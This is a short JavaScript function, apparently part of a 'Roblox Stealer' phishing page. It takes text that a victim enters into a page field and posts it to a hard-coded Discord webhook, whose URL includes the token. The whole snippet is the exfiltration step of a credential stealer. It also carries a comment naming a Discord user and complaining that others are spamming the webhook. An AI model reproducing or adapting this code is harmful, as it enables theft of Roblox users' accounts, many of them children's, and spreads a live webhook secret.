function sendMessage() {
    const content = document.getElementById('content').value;

    const embed = {
        title: "Roblox Stealer",
        description: content,
    };

    // alr skid spamming my hook add me on discord my username is networkcatwork

    const payload = {
        embeds: [embed],
    };

    fetch('https://discord.com/api/webhooks/1250234084618276915/fSe7TaYQiqt73J-ubOuexbbXFgqDI97eFvuQqm26Q9HEo3IrR91A8K6fZz69IQdHBk86', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            console.error('Failed to send message to Discord');
        }
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}
